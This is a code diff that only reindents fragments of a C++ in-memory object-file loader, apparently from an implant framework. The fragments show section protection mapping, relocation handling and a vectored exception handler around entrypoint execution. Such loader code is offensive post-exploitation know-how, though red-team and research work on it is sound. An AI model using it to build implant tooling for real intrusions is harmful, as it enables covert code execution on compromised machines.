@@ -12,7 +12,7 @@ namespace Objects {
 
     // TODO: add common BOF/internal implant functions
     HASH_MAP
-    __attribute__((used, section(".rdata"))) internal_map[] = {
+        __attribute__((used, section(".rdata"))) internal_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -23,7 +23,7 @@ namespace Objects {
     };
 
     HASH_MAP
-    __attribute__((used, section(".rdata"))) bof_map[] = {
+        __attribute__((used, section(".rdata"))) bof_map[] = {
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
         { .name = 0, .address = nullptr },
@@ -34,7 +34,7 @@ namespace Objects {
     };
 
     PVOID
-    __attribute__((used, section(".data"))) wrapper_return = nullptr;
+        __attribute__((used, section(".data"))) wrapper_return = nullptr;
 
     LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {
 
@@ -129,15 +129,15 @@ namespace Objects {
                 uint32 protect = 0;
 
                 switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
-                case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
-                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
-                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
-                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
-                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
-                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
-                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
-                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
-                default:
+                    case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
+                    case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
+                    case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
+                    case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
+                    case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
+                    case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
+                    case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
+                    case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
+                    default:
                     goto defer;
                 }
 
@@ -190,7 +190,7 @@ namespace Objects {
         WrapperFunction(entrypoint, args, size);
         success = true;
 
-    defer:
+        defer:
         if (veh_handle) {
             ctx->win32.RtlRemoveVectoredExceptionHandler(veh_handle);
         }
@@ -239,7 +239,7 @@ namespace Objects {
                             *(uint32 *) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                         }
                         default:
-                            break;
+                        break;
 
                     }
                 }
@@ -254,7 +254,7 @@ namespace Objects {
                         case IMAGE_REL_AMD64_ADDR32NB:  *(uint32 *) reloc_addr = *(uint32 *) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                         case IMAGE_REL_AMD64_ADDR64:    *(uint64 *) reloc_addr = *(uint64 *) reloc_addr + U_PTR(sec_addr);
                         default:
-                            break;
+                        break;
                     }
                 }
 #else
@@ -265,7 +265,7 @@ namespace Objects {
                             *(uint32 *) reloc_addr = U_PTR(fn_addr);
                         }
                         default:
-                            break;
+                        break;
                     }
                 }
                 else {
@@ -273,7 +273,7 @@ namespace Objects {
                         case IMAGE_REL_I386_DIR32: *(uint32 *)reloc_addr = (*(uint32 *)reloc_addr) + U_PTR(sec_addr);
                         case IMAGE_REL_I386_REL32: *(uint32 *)reloc_addr = (*(uint32 *)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32);
                         default:
-                            break;
+                        break;
                     }
                 }
 #endif
@@ -487,7 +487,7 @@ namespace Objects {
         x_assertb(BaseRelocation(image));
         x_assertb(ExecuteFunction(image, entrypoint, args, args_size));
 
-    defer:
+        defer:
         if (success) {
             // LOG SUCCESS?
         }
